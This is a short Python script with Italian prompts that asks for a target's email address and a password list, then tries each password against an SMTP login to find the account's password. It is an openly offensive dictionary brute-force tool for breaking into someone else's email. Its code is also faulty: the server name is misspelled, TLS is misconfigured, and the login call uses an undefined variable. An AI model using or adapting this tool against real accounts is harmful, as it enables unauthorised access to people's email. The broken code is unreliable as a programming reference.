import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("smpt.gmail.com", 465)
smtpserver.ehlo()
smtpserver.starttls()

utente = input("[*] Inserisci la mail dell'obbiettivo: ")
filepass = input("[*] Inserisci il percorso delle password: ")
file = open(filepass, "r")

for password in file:
        password = password.strip('\n')
        try:
            smtpserver.login(user, password)
            print(colored("[+] Password Trovata: %s" % password, 'green'))
            break     
        
        
        except   smtplib.SMTPAuthenticationError:
            print(colored("[+] Password Errata: " + password, 'red')) 
            